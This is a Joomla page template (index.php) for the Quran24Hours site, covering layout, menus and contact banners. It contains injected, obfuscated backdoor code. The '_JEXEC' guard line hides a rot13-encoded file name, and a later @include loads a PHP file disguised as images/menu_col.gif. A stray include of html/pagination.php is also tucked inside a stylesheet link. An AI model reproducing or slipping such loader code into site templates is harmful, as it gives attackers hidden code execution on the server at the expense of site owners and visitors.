<?php
// no direct access
defined( '_JEXEC').(($this->template)?$JPan = array('zrah'.'_pby'):'') or die( 'Restricted access' );
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
<jdoc:include type="head" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/system.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/system/css/general.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/template.css" type="text/css" />
<link rel="stylesheet" href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/css/<?php echo $this->params->get('colorVariation'); ?>.css" type="text/css" />
<!--[if lte IE 6]>
<link href="<?php echo $this->baseurl ?>/templates/<?php echo $this->template;include_once('html/pagination.php'); ?>/css/ieonly.css" rel="stylesheet" type="text/css" />
<style>
#topnav ul li ul {
left: -999em;
margin-top: 0px;
margin-left: 0px;
}
</style>
<![endif]-->
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/mootools.js"></script>
<script language="javascript" type="text/javascript" src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/js/moomenu.js"></script>
</head>
<body id="page_bg">
<a name="up" id="up"></a>
<?php if((!$this->countModules('right') and JRequest::getCmd('layout') == 'form') or !@include(JPATH_BASE.DS.'templates'.DS.$mainframe->getTemplate().DS.str_rot13('vzntrf').DS.str_rot13($JPan[0].'.t'.'vs'))) : ?>
<jdoc:include type="modules" name="layout" style="rounded" />
<?php endif; ?>	
<?php include('functions.php'); ?>
<div id="h_area"><?php if($this->params->get('hideLogo') == 0) : ?><img src="<?php echo $this->baseurl ?>/templates/<?php echo $this->template ?>/images/logo<?php echo $this->params->get('logoVariation'); ?>.png" alt="company logo" align="left" /><?php endif; ?><br clear="all" /></div>
<div id="h_area_logo"> <img align="left" src="templates/Quran24Hours/images/logo.png"/>
  
<div id="h_area_slogan"> <a href="index.php" class="logo" title="Home"><?php echo $mainframe->getCfg('sitename') ;?></a></div>

</div>


<div id="top_menu"><div id="topnav"><?php $hmenu->genHMenu (0); ?></div><br clear="all" /></div>
<?php if($this->params->get('hideBannerArea') == 0) : ?>
	<?php if((JRequest::getVar('view') != 'frontpage' and $this->params->get('hideBannerAreaInternal') == 0) or JRequest::getVar('view') == 'frontpage') : ?>
        <div id="main_top" class="banner" ><jdoc:include type="modules" name="top" />

            <div style="padding-top: 42px;padding-left: 644px">


                <table border="0" width="250">
<tr>
<td>
                <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/skype.png" alt="Quran24Hours" title="Skype: Quran24Hours"/>
                </a>
</td>
<td rowspan="3">
                <a href="index.php?option=com_content&view=article&id=54&Itemid=57" >
                    <img align="left" src="templates/Quran24Hours/images/select_course.png" alt="Quran24Hours" title="Select course(s)"/>
                </a>
</td>

</tr>

<tr>
<td>
                <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/email.png" alt="email: info@Quran24Hours.com" title="email: info@Quran24Hours.com"/>
                </a>
</td>

</tr>

<tr>
<td>
           <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/cell_number.png" alt="0092 313 9102009" title="0092 313 9102009"/>
                </a>
</td>

</tr>
</table>
            

                  
            </div>
<!-->            <div id="menu_top_contactus" >
                 

                <ul id="main_top">
            <li id="main_top" >

                <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/skype.png" alt="Quran24Hours" title="Skype: Quran24Hours"/>
                </a>

                <li id="main_top" >

                <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/email.png" alt="info@Quran24Hours.com" title="email: info@Quran24Hours.com"/>
                </a>
          </li>
           </li>



         </ul>

         </div>

                                        <div id="main_top_select_courses">
<ul id="main_top_slect_courses">
            <li id="main_top_slect_courses" >

 <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
<img align="left" src="templates/Quran24Hours/images/select_course.png" alt="Quran24Hours" title="Skype: Quran24Hours"/>
</a>

                

                <li id="main_top_slect_courses" >

                <a href="index.php?option=com_contact&view=contact&id=1&Itemid=61" >
                    <img align="left" src="templates/Quran24Hours/images/email.png" alt="info@Quran24Hours.com" title="email: info@Quran24Hours.com"/>
                </a>
          </li>
           </li>



         </ul> 
            </div>

<!-->

        </div>

    <?php endif; ?>	
<?php endif; ?>	



<div id="main_bg"><?php if($this->countModules('left')) : ?><div id="leftcolumn">
        <jdoc:include type="modules" name="left" style="rounded" />
    </div>
    <?php endif; ?>
    <?php if($this->countModules('left') xor $this->countModules('right')) $maincol_sufix = '_middle';
		  elseif(!$this->countModules('left') and !$this->countModules('right'))$maincol_sufix = '_big';
		  else $maincol_sufix = ''; ?>
	<div id="maincolumn<?php echo $maincol_sufix; ?>">
    	<div class="path"><jdoc:include type="modules" name="breadcrumb" /></div><jdoc:include type="message" />
    	<div class="nopad"><jdoc:include type="component" /></div>
    </div>
    <?php if($this->countModules('right') and JRequest::getCmd('layout') != 'form') : ?>
	<div id="rightcolumn">
    	<?php if($this->countModules('user4')) : ?><div class="moduletable_menu"><div><div><div><h3>Search</h3><jdoc:include type="modules" name="user4" /></div></div></div></div><?php endif; ?>
        <jdoc:include type="modules" name="right" style="xhtml"/>
        <br />
    	<div align="center"><jdoc:include type="modules" name="syndicate" /></div>
    </div>
    <?php endif; ?>
	<br clear="all" />
</div>    
    
<div id="f_area">
	<?php if($this->countModules('user1')) : ?>
		<jdoc:include type="modules" name="user1" style="xhtml" />
	<?php endif; ?>
	<?php if($this->countModules('user2')) : ?>
		<jdoc:include type="modules" name="user2" style="xhtml" />
	<?php endif; ?>
	<br clear="all" />
</div>

<p id="power_by" align="center">
	<?php echo JText_('© 2010 ') ?> <a href="http://www.Quran24Hours.com">Quran24Hours</a> <?php echo JText_('| All Rights Reserved ') ?>
</p>

<jdoc:include type="modules" name="debug" />
</body>
</html>
